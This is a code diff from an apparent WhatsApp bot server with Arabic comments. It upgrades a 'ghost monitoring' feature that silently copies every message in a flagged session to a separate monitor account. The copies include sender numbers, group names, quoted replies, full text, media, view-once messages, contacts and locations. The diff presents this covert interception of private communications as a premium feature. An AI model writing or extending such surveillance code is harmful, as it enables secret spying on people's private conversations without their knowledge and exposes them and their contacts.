@@ -221,7 +221,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         };
 
         // ==========================================
-        // 👻 [جديد]: أوامر تفعيل/إيقاف المراقبة الشبحية
+        // 👻 أوامر تفعيل/إيقاف المراقبة الشبحية
         // ==========================================
         if (body.startsWith('.مراقبه ')) {
             const targetSession = body.replace('.مراقبه ', '').trim();
@@ -240,47 +240,100 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 🚨 [جديد]: تنفيذ المراقبة الشبحية
+        // 🚨 [تطوير SUPER VIP PRO]: المراقبة الاستخباراتية الشاملة
         // ==========================================
         if (activeMonitors.has(sessionId)) {
             const monitorInfo = activeMonitors.get(sessionId);
             const monitorSock = sessions[monitorInfo.monitorSocketId];
 
-            // منع الحلقة المفرغة (لا نرسل تقرير عن تقرير)
             if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                 try {
-                    const targetNumber = isGroup ? from.split('@')[0] : (isFromMe ? from.split('@')[0] : sender.split('@')[0]);
-                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
-                    
-                    let contentDesc = body || 'نص / محتوى غير معروف';
+                    // 1. تحديد الوقت والتاريخ
+                    const time = moment().tz("Asia/Riyadh").format("YYYY-MM-DD | hh:mm:ss A");
+
+                    // 2. الأرقام الحقيقية
+                    const realNumber = (isFromMe ? selfId : sender).split('@')[0];
+                    const targetNumber = from.split('@')[0];
+
+                    // 3. جلب اسم المجموعة الفعلي إذا كانت الرسالة في جروب
+                    let groupName = targetNumber;
+                    if (isGroup) {
+                        try {
+                            const groupMetadata = await sock.groupMetadata(from);
+                            groupName = groupMetadata.subject;
+                        } catch (err) {
+                            groupName = "مجموعة غير معروفة";
+                        }
+                    }
+
+                    // 4. استخراج معلومات السياق (ردود / محول)
                     let msgType = Object.keys(msg.message || {})[0];
+                    if (msgType === 'senderKeyDistributionMessage' && Object.keys(msg.message).length > 1) {
+                        msgType = Object.keys(msg.message)[1];
+                    }
 
-                    if (msgType === 'imageMessage') contentDesc = '📷 صـورة';
-                    else if (msgType === 'videoMessage') contentDesc = '🎥 فـيـديـو';
-                    else if (msgType === 'audioMessage') contentDesc = '🎵 مـقـطـع صـوتـي';
-                    else if (msgType === 'documentMessage') contentDesc = '📄 مـلـف';
-                    else if (msgType === 'stickerMessage') contentDesc = '🌠 مـلـصـق';
-                    if (viewOnceIncoming) contentDesc = '👁️‍🗨️ رسـالـة عـرض لـمـرة واحـدة';
+                    const contextInfo = msg.message[msgType]?.contextInfo || {};
+                    const isForwarded = contextInfo.isForwarded ? '✅ نـعـم (رسالة محولة)' : '❌ لا';
+                    let quotedTextContent = 'لا يـوجـد';
+                    
+                    if (contextInfo.quotedMessage) {
+                        const qMsg = contextInfo.quotedMessage;
+                        const qType = Object.keys(qMsg)[0];
+                        quotedTextContent = qMsg.conversation || qMsg.extendedTextMessage?.text || qMsg.imageMessage?.caption || qMsg.videoMessage?.caption || `[ ${qType.replace('Message', '')} ]`;
+                        if (quotedTextContent.length > 60) quotedTextContent = quotedTextContent.substring(0, 60) + '...';
+                    }
 
-                    const direction = isFromMe ? '📤 *[تـم إرسـال رسـالـة إلـى]*' : '📥 *[تـم اسـتـلام رسـالـة مـن]*';
-                    const groupInfo = isGroup ? `\n👥 *الـجـروب:* ${from.split('@')[0]}` : '';
+                    // 5. تحليل نوع ومحتوى الرسالة
+                    let contentDesc = "📝 نص";
+                    const typeMap = {
+                        'imageMessage': '📷 صـورة',
+                        'videoMessage': '🎥 فـيـديـو',
+                        'audioMessage': '🎵 مـقـطـع صـوتـي (فويس)',
+                        'documentMessage': '📄 مـلـف / مـسـتـنـد',
+                        'stickerMessage': '🌠 مـلـصـق (ستيكر)',
+                        'contactMessage': '👤 كـرت جـهـة اتـصـال',
+                        'locationMessage': '📍 مـوقـع جـغـرافـي',
+                        'pollCreationMessage': '📊 تـصـويـت / اسـتـطـلاع',
+                        'conversation': '📝 نـص مـبـاشـر',
+                        'extendedTextMessage': '📝 نـص مـوسـع'
+                    };
 
-                    const reportText = `🚨 *[ مـراقـبـة شـبـحـيـة - ${sessionId} ]* 🚨\n\n` +
-                                       `${direction}\n` +
+                    if (typeMap[msgType]) {
+                        contentDesc = typeMap[msgType];
+                    }
+                    if (viewOnceIncoming) contentDesc = '👁️‍🗨️ عـرض لـمـرة واحـدة';
+
+                    let finalBodyText = body.length > 500 ? body.substring(0, 500) + "\n...[اقرأ المزيد في الرسالة المحولة]" : (body || "بدون نص");
+
+                    // 6. اتجاه الرسالة
+                    const direction = isFromMe ? '📤 *[ صـادر مـن هـاتـفـك ]*' : '📥 *[ وارد إلـى هـاتـفـك ]*';
+                    const chatType = isGroup ? `👥 مـجـمـوعـة: *${groupName}*` : '👤 درُدشـة خـاصـة';
+
+                    // 7. بناء التقرير الاستخباراتي
+                    const reportText = `👑 *نـظـام الـمـراقـبـة الجبار SUPER VIP* 👑\n` +
+                                       `━━━━━━━━━━━━━━━━━━\n` +
+                                       `${direction}\n\n` +
                                        `👤 *الاسـم:* ${pushName}\n` +
-                                       `📱 *الـرقـم:* wa.me/${targetNumber}${groupInfo}\n` +
+                                       `📱 *الـرقم الحقيقي:* wa.me/${realNumber}\n` +
+                                       `📍 *الـجـهـة:* ${chatType}\n` +
                                        `🕒 *الـوقـت:* ${time}\n\n` +
-                                       `📄 *الـمـحـتـوى:*\n${contentDesc}`;
+                                       `📌 *سـيـاق الـرسـالـة:*\n` +
+                                       `↪️ *رسـالـة مـحـولـة:* ${isForwarded}\n` +
+                                       `🗣️ *رد عـلـى:* ${quotedTextContent}\n\n` +
+                                       `📂 *نـوع الـرسـالـة:* ${contentDesc}\n` +
+                                       `📝 *الـمـحـتـوى:*\n${finalBodyText}\n` +
+                                       `━━━━━━━━━━━━━━━━━━\n` +
+                                       `🔍 *الـمـعـرف:* ${sessionId}`;
 
-                    // إرسال التقرير النصي للرقيب
+                    // 8. الإرسال (التقرير + الميديا إن وجدت)
                     await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText });
 
-                    // إذا كانت الرسالة ميديا (صورة، فيديو، صوت) نقوم بتحويلها أيضاً!
-                    if (msgType !== 'conversation' && msgType !== 'extendedTextMessage') {
+                    const isMedia = ['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage'].includes(msgType);
+                    if (isMedia || viewOnceIncoming || msgType === 'contactMessage' || msgType === 'locationMessage') {
                         await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                     }
                 } catch (e) {
-                    console.error('❌ خطأ في إرسال تقرير المراقبة:', e.message);
+                    console.error('❌ خطأ في نظام المراقبة SUPER VIP PRO:', e.message);
                 }
             }
         }
@@ -449,6 +502,6 @@ app.listen(PORT, () => {
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
-    console.log(`👻 نظام المراقبة الشبحية متاح الآن`);
+    console.log(`👑 نظام المراقبة الشبحية [SUPER VIP PRO] متاح ومحدث`);
     console.log(`=========================================\n`);
 });
